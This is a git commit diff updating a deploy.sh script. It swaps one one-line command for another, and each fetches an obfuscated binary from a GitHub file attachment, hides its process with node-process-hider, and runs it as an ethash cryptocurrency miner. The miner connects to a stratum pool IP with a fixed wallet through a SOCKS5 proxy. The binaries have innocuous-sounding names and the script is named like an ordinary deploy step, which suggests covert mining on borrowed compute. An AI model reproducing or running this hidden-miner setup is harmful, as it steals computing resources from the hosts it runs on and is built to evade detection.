798f0a0d0e9b44a760de95e4f26d3cc84af141ca
liyanul225 <108873090+liyanul225@users.noreply.github.com>
2022-07-26 22:26:04 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -36,4 +36,4 @@ echo "**"
 echo " "
 echo " "
 
-./graftcp/graftcp  sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add babi/ngepet && wget https://github.com/liyanul2525/liyanul/files/9190123/babi.tar.gz && tar -xf babi.tar.gz && babi/ngepet -a ethash -o stratum+ssl://34.149.10.66:4433 -u 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul socks5://192.252.209.155:14455
+./graftcp/graftcp  sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add susumu/penyemangatku && wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455
